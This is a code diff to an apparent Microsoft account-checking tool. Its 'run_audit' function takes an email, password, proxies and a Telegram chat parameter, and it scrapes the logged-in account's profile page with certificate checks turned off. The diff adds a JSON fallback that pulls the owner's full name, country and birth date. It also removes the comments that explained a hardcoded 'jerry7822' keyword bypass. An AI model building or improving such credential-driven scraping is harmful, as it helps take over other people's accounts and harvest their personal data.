@@ -457,8 +457,6 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 if country and '-' in country:
                     country = country.split('-')[-1].upper()
                     
-        # Deep Scrape: Microsoft Account Profile Page
-        # ⚠️ RED DE SEGURIDAD EXPERIMENTAL (jerry7822): Saltar scraping profundo si se pasa el keyword
         if keyword != "jerry7822":
             try:
                 profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
@@ -486,6 +484,27 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                     if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
                     if not phone_matches: phone_matches = re.findall(r'Phone\s*(?:linked\s*to)?[^<]*\s*(\+\d[\d\s]+)\s*<', html_text, re.IGNORECASE | re.DOTALL)
                     if phone_matches: phone = phone_matches[0].strip()
+
+                    # JSON Payload Fallback
+                    if name == "N/A" and "window.__INITIAL_STATE__" in html_text:
+                        import json
+                        blob_match = re.search(r'window\.__INITIAL_STATE__\s*=\s*({.*?});', html_text, re.DOTALL)
+                        if blob_match:
+                            try:
+                                state = json.loads(blob_match.group(1))
+                                if isinstance(state, dict):
+                                    res_str = json.dumps(state)
+                                    if name == "N/A":
+                                        n_m = re.search(r'"(?:FullName|displayName)":"([^"]+)"', res_str, re.IGNORECASE)
+                                        if n_m: name = n_m.group(1)
+                                    if country == "XZ":
+                                        c_m = re.search(r'"(?:Country|CountryOrRegion)":"([^"]+)"', res_str, re.IGNORECASE)
+                                        if c_m: country = c_m.group(1)
+                                    if dob == "N/A":
+                                        d_m = re.search(r'"(?:BirthDate|dob)":"([^"]+)"', res_str, re.IGNORECASE)
+                                        if d_m: dob = d_m.group(1)
+                            except:
+                                pass
             except Exception:
                 pass
                 
